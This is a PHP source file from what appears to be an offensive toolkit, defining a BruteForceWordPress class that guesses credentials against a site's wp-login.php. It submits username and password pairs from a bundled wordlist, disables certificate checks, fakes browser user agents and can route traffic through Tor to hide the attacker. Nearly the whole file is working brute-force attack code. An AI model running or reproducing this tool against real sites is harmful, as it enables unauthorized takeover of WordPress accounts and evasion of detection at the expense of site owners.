<?php
/**
 * Created by PhpStorm.
 * User: lenonleite
 * Date: 01/07/16
 * Time: 18:13
 */

namespace Aszone\exploits;

use Aszone\FakeHeaders\FakeHeaders;
use GuzzleHttp\Client;
use Symfony\Component\DomCrawler\Crawler;

class BruteForceWordPress
{
    public $file;

    public $language;

    public $commandData;

    public $url;

    public $urlBaseExploit;

    public $folderSave;

    public $folderDownload;

    public function __construct($commandData)
    {

        $this->commandData = array_merge($this->defaultEnterData(), $commandData);
        $this->folderDownload = __DIR__."/../../../../results/exploits/wordpress/";

    }

    private function defaultEnterData()
    {
        $dataDefault['dork'] = false;
        $dataDefault['pl'] = false;
        $dataDefault['tor'] = false;
        $dataDefault['torl'] = false;
        $dataDefault['virginProxies'] = false;
        $dataDefault['proxyOfSites'] = false;

        return $dataDefault;
    }

    public function sendDataToLoginWordPress($username, $password, $target)
    {
        try {
            $cookie = 'cookie.txt';

            $postdata = 'log='.$username.'&pwd='.$password.'&wp-submit=Log%20In&redirect_to='.$target.'wp-admin/&testcookie=1';
            $ch = \curl_init();
            $header = new FakeHeaders();
            if ($this->isHttps($target)) {
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            }
            curl_setopt($ch, CURLOPT_URL, $target.'wp-login.php');
            curl_setopt($ch, CURLOPT_USERAGENT, $header->getUserAgent()['User-Agent']);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
            curl_setopt($ch, CURLOPT_REFERER, $target.'wp-admin/');
            curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);

            if (!empty($this->tor)) {
                curl_setopt($ch, CURLOPT_PROXY, $this->tor);
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                curl_setopt($ch, CURLOPT_VERBOSE, 0);
            }

            $result['body'] = curl_exec($ch);
            $result['status'] = curl_getinfo($ch);

            curl_close($ch);

            //Check if only login is https, if is https return method with target correcty
            if ($this->isHttps($result['status']['url']) and is_null($this->isHttps($target))) {
                $this->target = $result['status']['url'];
                $baseUrlHttps = $this->getBaseUrlWordPressByUrl($result['status']['url']);
                $result = $this->sendDataToLoginWordPress($username, $password, $baseUrlHttps);
            }

            return $result;
        } catch (\Exception $e) {
            echo $e->getMessage();
            $result['body'] = $e->getMessage();
            $result['status'] = $e->getCode();
            exit();
        }

        return $result;
    }

    public function getWordListInArray($wordlist = '')
    {
        if (empty($wordlist)) {

            $wordlist = __DIR__ . '/resource/litleWordListPt.txt';
            $arrWordlist = file($wordlist, FILE_IGNORE_NEW_LINES);
            return $arrWordlist;
        }

        $checkFileWordList = v::file()->notEmpty()->validate($wordlist);
        if ($checkFileWordList) {
            $targetResult = file($wordlist, FILE_IGNORE_NEW_LINES);

            return $targetResult;
        }

        return false;
    }

}